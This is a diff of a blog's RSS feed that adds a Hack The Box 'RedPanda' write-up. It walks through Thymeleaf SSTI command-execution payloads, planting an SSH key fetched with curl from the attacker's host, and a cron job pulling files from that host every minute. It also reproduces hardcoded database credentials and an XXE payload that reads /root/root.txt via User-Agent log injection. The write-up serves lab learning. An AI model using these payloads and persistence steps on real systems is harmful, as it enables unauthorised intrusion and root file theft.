@@ -1,4 +1,214 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 20 Aug 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>DEFCON 30 - Homecoming</title><link>https://maclarel.github.io/posts/2022-08/defcon30/</link><pubDate>Sat, 20 Aug 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-08/defcon30/</guid><description>At last, DEFCON&amp;hellip; I&amp;rsquo;ve wanted to go to DEFCON since I first heard about it almost 20 years ago, and finally the stars aligned and it was a possibility this year. Spoilers, it didn&amp;rsquo;t disappoint.
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Tue, 30 Aug 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - RedPanda</title><link>https://maclarel.github.io/posts/2022-08/htb_redpanda/</link><pubDate>Tue, 30 Aug 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-08/htb_redpanda/</guid><description>Premise RedPanda is a machine challenge that presents the attacker with a web app displaying cute pictures of Red Pandas. Adorable. The goal, as usual, is to find both user and root flags. This is done through a combination of SSTI and XXE, and admittedly is one of the most difficult challenges that I&amp;rsquo;ve completed so far&amp;hellip; despite being on the &amp;ldquo;easy&amp;rdquo; end of the spectrum.
+Notes in this writeup will be a bit more freeform than others as I think sharing the overall approach I took may be of interest.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p>RedPanda is a <code>machine</code> challenge that presents the attacker with a web app displaying cute pictures of Red Pandas. Adorable. The goal, as usual, is to find both user and root flags. This is done through a combination of SSTI and XXE, and admittedly is one of the most difficult challenges that I&rsquo;ve completed so far&hellip; despite being on the &ldquo;easy&rdquo; end of the spectrum.</p>
+<p>Notes in this writeup will be a bit more freeform than others as I think sharing the overall approach I took may be of interest. From talking to others who have completed the challenge, I probably took a strange path.</p>
+<h1 id="recon">Recon</h1>
+<p>The machine doesn&rsquo;t respond to ICMP, which had me questioning my VPN connection, but this is intentional. Need to use <code>-Pn</code> with <code>nmap</code> to scan despite this.</p>
+<ul>
+<li>22 and 8080 open</li>
+<li>22 is ssh</li>
+<li>8080 is a spring boot app</li>
+</ul>
+<p><code>ffuf</code> suggests there are /search, /stats, and /error endpoints. <code>/stats</code> gives us some other paths to look at</p>
+<p>There&rsquo;s a hint on the <code>greg</code> page that there&rsquo;s an injection possible somewhere. The stats pages also have an export capability that will dump XML - possible a vector here if we&rsquo;re able to upload content somehow? Doesn&rsquo;t look like there&rsquo;s an endpoint for that.</p>
+<p>The author search is a parameterized URL. Smells like a job for <code>sqlmap</code>, though in the end it doesn&rsquo;t think it&rsquo;s injectable even with max level risk, so this was a dead end.</p>
+<p>Nikto is noting that the server allows other methods that could be fun:</p>
+<pre><code>OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+</code></pre><p>This may be a false positive though as none of the endpoints I can hit (including root) actually return these with an OPTIONS call. Apparently this is just a weird thing with spring boot and may be worth ignoring</p>
+<p>There appears to be some form of filtering for the search as the <code>_</code> character is &ldquo;banned&rdquo;, and we can throw a 500 by searching for <code>\</code>. The search allows us to do partials, so we can go by each letter and see what we get back. For example <code>e</code> will return <code>smiley</code> as one of the results. This gives us lots of cute pandas, but nothing actionable.</p>
+<p>Input does seem to be sanitized for what&rsquo;s returned, so no XSS or obvious sqli. Stats <em>might</em> have something injectable but as noted above, no real luck with it&hellip;</p>
+<p>And after some more poking at this&hellip; WE HAVE SSTI! - <code>*{7*7}</code> - some examples of different prefixes @ <a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/">https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/</a> in <code>hacking thymeleaf</code> heading. <a href="https://github.com/VikasVarshney/ssti-payload">https://github.com/VikasVarshney/ssti-payload</a> is also an excellent tool to generate these payloads.</p>
+<ul>
+<li>Note from future me: This level of encoding was entirely unneeded, but it did work and since I could easily build the encoded string with a script I just ran with it. Obfuscation is a good skill, right? :P</li>
+</ul>
+<p>Here&rsquo;s an example SSTI we can use to do a whoami:</p>
+<pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
+</code></pre><p>and uname -a:</p>
+<pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(117).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97))).getInputStream())}
+</code></pre><p>We can use this to get our user flag:</p>
+<pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())}
+</code></pre><p>Do they have an ssh key we can pull? Doesn&rsquo;t look like it&hellip; but we could probably generate one.</p>
+<p>Let&rsquo;s try an encoded version of <code>ssh-keygen -b 2048 -t rsa -f /tmp/sshkely -q -N &quot;&quot;</code>:</p>
+<pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(115).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(113)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(34))).getInputStream())}
+</code></pre><p>Yep, that works. Now let&rsquo;s get the public key, and cat it into our authorized keys&hellip; so same deal as above, but need to create our <code>.ssh</code> dir first.</p>
+<p>This will probably work, but getting errors with the private key we can leak. Let&rsquo;s try adding my own public key to the remote authorized_keys. We&rsquo;ll probably need to do this by setting up a webserver with python to serve an authorized_keys file we&rsquo;ve created, pull it down with curl, and then update perms. Echoing a string with redirects gets filtered.</p>
+<p>Bingo - <code>woodenk@redpanda:~$ </code></p>
+<p>Commands we used or encoded:</p>
+<pre><code>cp ~/.ssh/id_rsa.pub authorized_keys
+python3 -m http.server
+# encode and send the rest to remote server
+mkdir /home/woodenk/.ssh
+curl http://&lt;vpn_ip&gt;:8000/authorized_keys -o /home/woodenk/.ssh/authorized_keys
+chmod -R 0700 /home/woodenk/.ssh
+chown -R woodenk:woodenk /home/woodenk/.ssh
+</code></pre><h1 id="lets-get-to-the-root-of-the-problem">Let&rsquo;s get to the root of the problem</h1>
+<p>Looks like we have a few processes running as <code>root</code> but <code>sudo</code>ing the execution as <code>woodenk</code>&hellip; cron job?:</p>
+<pre><code>root         878  0.0  0.0   2608   536 ?        Ss   Jul30   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+root         879  0.0  0.2   9420  4576 ?        S    Jul30   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+</code></pre><p>Yep</p>
+<pre><code>root         860  0.0  0.1   6812  3008 ?        Ss   Jul30   0:00 /usr/sbin/cron -f
+root         863  0.0  0.1   8356  3404 ?        S    Jul30   0:00  \_ /usr/sbin/CRON -f
+root         878  0.0  0.0   2608   536 ?        Ss   Jul30   0:00      \_ /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+root         879  0.0  0.2   9420  4576 ?        S    Jul30   0:00          \_ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+woodenk      884 10.2 30.7 3140528 623772 ?      Sl   Jul30  10:10              \_ java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+</code></pre><p>We can&rsquo;t write to <code>root</code>&rsquo;s <code>crontab</code>, nor do we have permissions to modify the jar file noted above. One thing that will be useful for us shortly is that the uncompiled Java code for all of the applications in use for the challenge is available on the box. While it&rsquo;s certainly possible to decompile the running <code>jar</code>s (and needing to do so would have been an evil twist&hellip;), we have everything we need for some whitebox analysis at this point.</p>
+<p>There&rsquo;s a <code>cleanup.sh</code> in <code>/opt/</code> that uses find and executes an rm against what it finds. Maybe there&rsquo;s a way to exploit this with a fishy filename? Come back to this, not an obvious path.</p>
+<p>We have some hardcoded creds for MySQL in the source for the app under <code>/opt/panda_search/src/</code>:</p>
+<pre><code>conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;);
+</code></pre><p>Note: This is the user password for the OS as well, so we can use it for SSH!</p>
+<p>Creds are valid, but the data is useless to us - it&rsquo;s the same stuff we saw about pandas in a browser&hellip; but&hellip; could we add a panda and have the image be the flag? Probably not, but let&rsquo;s try&hellip; The insert works and we can see it in the portal, but the path doesn&rsquo;t resolve as it just comes relative to the website and is passed in verbatim. MySQL is also smart and locks us in as the same user - woodenk - so no priv esc here.</p>
+<h1 id="i-pspy-with-my-little-eye">I <code>pspy</code> with my little eye</h1>
+<pre><code>2022/07/31 15:06:01 CMD: UID=0    PID=1443   | /usr/sbin/CRON -f 
+2022/07/31 15:06:01 CMD: UID=0    PID=1444   | /bin/sh -c /root/run_credits.sh 
+2022/07/31 15:06:01 CMD: UID=0    PID=1446   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
+2022/07/31 15:06:01 CMD: UID=0    PID=1445   | /bin/sh /root/run_credits.sh 
+...
+2022/07/31 15:10:01 CMD: UID=0    PID=1601   | /bin/sh /root/run_credits.sh 
+2022/07/31 15:10:01 CMD: UID=0    PID=1600   | /bin/sh -c /root/run_credits.sh 
+2022/07/31 15:10:01 CMD: UID=0    PID=1604   | /bin/sh /root/run_credits.sh 
+2022/07/31 15:10:01 CMD: UID=0    PID=1603   | sudo -u woodenk /opt/cleanup.sh 
+2022/07/31 15:10:01 CMD: UID=0    PID=1602   | /bin/sh -c sudo -u woodenk /opt/cleanup.sh 
+2022/07/31 15:10:01 CMD: UID=0    PID=1605   | /usr/bin/systemd-tmpfiles --clean 
+2022/07/31 15:10:01 CMD: UID=1000 PID=1621   | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 
+2022/07/31 15:10:01 CMD: UID=0    PID=1620   | /lib/systemd/systemd-udevd 
+2022/07/31 15:10:01 CMD: UID=1000 PID=1619   | /bin/bash /opt/cleanup.sh 
+2022/07/31 15:10:01 CMD: UID=0    PID=1622   | /lib/systemd/systemd-udevd 
+2022/07/31 15:10:01 CMD: UID=1000 PID=1625   | /bin/bash /opt/cleanup.sh 
+2022/07/31 15:10:01 CMD: UID=0    PID=1633   | /lib/systemd/systemd-udevd 
+2022/07/31 15:10:01 CMD: UID=1000 PID=1635   | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 
+2022/07/31 15:10:01 CMD: UID=1000 PID=1636   | /usr/bin/find /dev/shm -name *.jpg -exec rm -rf {} ; 
+2022/07/31 15:10:01 CMD: UID=1000 PID=1637   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 
+
+</code></pre><p>Maybe we could do something with this? I doubt we can read the file, but worth a try in a bit. Looks like this may run every 2 minutes&hellip; Worst case we should be able to review what LogParser does.</p>
+<p>Confirming we can&rsquo;t read the stuff from root&rsquo;s dir, but let&rsquo;s see what logparser does. AFAICT this is the overall flow:</p>
+<ul>
+<li>Open the log file at <code>/opt/panda_search/redpanda.log</code></li>
+<li>Parse the log looking for <em>A LINE</em> (the whole line) that conatins <code>.jpg</code></li>
+<li>If the line contains a <code>.jpg</code> reference, parse with the following logic:</li>
+</ul>
+<pre><code>    public static Map parseLog(String line) {
+        String[] strings = line.split(&quot;\\|\\|&quot;);
+        Map map = new HashMap&lt;&gt;();
+        map.put(&quot;status_code&quot;, Integer.parseInt(strings[0]));
+        map.put(&quot;ip&quot;, strings[1]);
+        map.put(&quot;user_agent&quot;, strings[2]);
+        map.put(&quot;uri&quot;, strings[3]);
+        
+
+        return map;
+    }
+</code></pre><ul>
+<li>Get the artist metadata:</li>
+</ul>
+<pre><code>            System.out.println(parsed_data.get(&quot;uri&quot;));
+            String artist = getArtist(parsed_data.get(&quot;uri&quot;).toString());
+</code></pre><pre><code>    public static String getArtist(String uri) throws IOException, JpegProcessingException
+    {
+        String fullpath = &quot;/opt/panda_search/src/main/resources/static&quot; + uri;
+        File jpgFile = new File(fullpath);
+        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
+        for(Directory dir : metadata.getDirectories())
+        {
+            for(Tag tag : dir.getTags())
+            {
+                if(tag.getTagName() == &quot;Artist&quot;)
+                {
+                    return tag.getDescription();
+                }
+            }
+        }
+
+        return &quot;N/A&quot;;
+    }
+</code></pre><p>Note: Can we put our payload in the image metadata? 🤔</p>
+<ul>
+<li>Dump the output to an XML file:</li>
+</ul>
+<pre><code>            System.out.println(&quot;Artist: &quot; + artist);
+            String xmlPath = &quot;/credits/&quot; + artist + &quot;_creds.xml&quot;;
+            addViewTo(xmlPath, parsed_data.get(&quot;uri&quot;).toString());
+</code></pre><p>Current line of thinking is that we might be able to abuse the Artist jpg metdata to create a bogus path and write out our root flag since this process should have access to it. We&rsquo;re no longer limited by the database varchar size limit on the artist name, which should come in handy.</p>
+<p>Our URI <em>does</em> need to be a jpg file, but with how this is formed (a filesystem path) we might be able to store this in a location we control. So the overall steps might be something like:</p>
+<ul>
+<li>Create an image with malicious Artist metadata</li>
+<li>Send a request to that image through a forged database entry that associates it with a panda</li>
+<li>This then writes out a log file in /credits/ with a name we control&hellip;</li>
+<li>Can we then abuse <code>find</code> to run this? Hmmm&hellip;</li>
+</ul>
+<p>Reading through some XXE notes, we may be able to leverage a new entity in the file we control to inject a filepath for it to return in the output, in a field we arbitrarily name.</p>
+<p>Since we know this is writing to a file location that we can control, and we know that when that file is then read by the other process it must have an author of <code>woodenk</code> or <code>damian</code>&hellip;</p>
+<pre><code>      System.out.println(&quot;Exporting xml of: &quot; + author);
+      if(author.equals(&quot;woodenk&quot;) || author.equals(&quot;damian&quot;))
+      {
+          InputStream in = new FileInputStream(&quot;/credits/&quot; + author + &quot;_creds.xml&quot;);
+          System.out.println(in);
+          return IOUtils.toByteArray(in);
+      }
+      else
+      {
+          return IOUtils.toByteArray(&quot;Error, incorrect paramenter 'author'\n\r&quot;);
+      }
+  }
+</code></pre><h1 id="wwf-wwe-wcw-nah-xxe">WWF? WWE? WCW? Nah&hellip; XXE!</h1>
+<p>Can we do something like this?</p>
+<ul>
+<li>Get an arbitrary image</li>
+<li>Update it with exiftool <code>exiftool -Artist=&quot;../home/woodenk/pwn' &lt;image&gt;.jpg</code>
+<ul>
+<li>Note that we need the .. here as it&rsquo;s going to resolve relative to <code>/credits/</code> as seen earlier</li>
+</ul>
+</li>
+<li>Upload that file to <code>/home/woodenk</code></li>
+<li>Create our XXE injection with something based on the actual XML output&hellip;</li>
+</ul>
+<pre><code>&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY injection SYSTEM &quot;file:///root/root.txt&quot;&gt; ]&gt;
+&lt;credits&gt;
+&lt;author&gt;woodenk&lt;/author&gt;
+&lt;image&gt;
+&lt;uri&gt;/../../../../../../../../home/woodenk/panda.jpg&lt;/uri&gt;
+&lt;pwn&gt;&amp;injection;&lt;/pwn&gt;
+&lt;views&gt;1&lt;/views&gt;
+&lt;/image&gt;
+&lt;/credits&gt;
+</code></pre><ul>
+<li>Save this file to <code>/home/woodenk/pwn_creds.xml</code> so that we can request it when the artist is evaluated and we get our path
+<ul>
+<li>Note, this way it&rsquo;s going to be used by <code>addViewTo</code> in the log parser&hellip;</li>
+</ul>
+</li>
+<li>Since we&rsquo;re associating this with another author (woodenk for example) we may get the injection output in that export? Somehow?</li>
+</ul>
+<p>But how will we request this image in the first place? Can we use SQLi to point a URI to it?</p>
+<p>Also note that both this image and the xml file are going to get deleted, often, so we need to figure out some persistence. I&rsquo;m thinking a cron job that&rsquo;ll run a <em>script</em> out of /dev/shm that&rsquo;ll download these from my host every minute and dump into /home/woodenk</p>
+<p>Placed this script in /dev/shm/foo.sh, and set up cron job to run every minute</p>
+<pre><code>remote=&quot;10.10.14.10:8000&quot;
+curl http://$remote/panda.jpg -o /home/woodenk/panda.jpg
+curl http://$remote/pwn_creds.xml -o /home/woodenk/pwn_creds.xml
+</code></pre><pre><code>remote=&quot;10.10.14.10:8000&quot;
+curl http://$remote/panda.jpg -o /home/woodenk/panda.jpg
+curl http://$remote/pwn_creds.xml -o /home/woodenk/pwn_creds.xml
+</code></pre><p>Now we sit back and wait to see if it works&hellip; Yep, this works for persistence, now let&rsquo;s figure out how to request this damn file in the first place&hellip;</p>
+<p>As far as I can tell, we need to send a request but we can&rsquo;t hit that URI&hellip;</p>
+<p>Fortunately the log parsing is &ldquo;dumb&rdquo; and is looking at positional locations based on a delimieter we know&hellip; <code>||</code> as seen in <code>App.java</code>:</p>
+<pre><code>    public static Map parseLog(String line) {
+        String[] strings = line.split(&quot;\\|\\|&quot;);
+        Map map = new HashMap&lt;&gt;();
+        map.put(&quot;status_code&quot;, Integer.parseInt(strings[0]));
+        map.put(&quot;ip&quot;, strings[1]);
+        map.put(&quot;user_agent&quot;, strings[2]);
+        map.put(&quot;uri&quot;, strings[3]);
+        
+
+        return map;
+    }
+</code></pre><p>Can we override the user agent and just send <em>any</em> request?</p>
+<p><code>curl http://10.129.73.208:8080/ -H &quot;User-Agent: ||/../../../../../../../../home/woodenk/panda.jpg&quot;</code></p>
+<p>Let&rsquo;s spam this and see what happens&hellip; Also going to back off cron job to every 5 min so I don&rsquo;t clobber my own output. No luck yet. Time for a break and come back fresh.</p>
+<p>I just needed to be patient :) Approach above works! Had to wait for background jobs to all run on cron. That lag I noted earlier about the export info being updated is real and almost threw me off course here.</p>
+<p>GG!</p>
+]]></content></item><item><title>DEFCON 30 - Homecoming</title><link>https://maclarel.github.io/posts/2022-08/defcon30/</link><pubDate>Sat, 20 Aug 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-08/defcon30/</guid><description>At last, DEFCON&amp;hellip; I&amp;rsquo;ve wanted to go to DEFCON since I first heard about it almost 20 years ago, and finally the stars aligned and it was a possibility this year. Spoilers, it didn&amp;rsquo;t disappoint.
 While DEFCON is no longer the insane party that you may have heard of in the past, it&amp;rsquo;s none the less three-ish days of discovery and debauchery. Everything from super in-depth talks, to scavenger hunterse, to impromptu analog synth parties in the back end of the venue last at night after most folks have gone to bed.</description><content type="html"><![CDATA[<h1 id="at-last-defcon">At last, DEFCON&hellip;</h1>
 <p>I&rsquo;ve wanted to go to DEFCON since I first heard about it almost 20 years ago, and finally the stars aligned and it was a possibility this year. Spoilers, it didn&rsquo;t disappoint.</p>
 <p>While DEFCON is no longer the insane party that you may have heard of in the past, it&rsquo;s none the less three-ish days of discovery and debauchery. Everything from super in-depth talks, to scavenger hunterse, to impromptu analog synth parties in the back end of the venue last at night after most folks have gone to bed. The vibe was real.</p>
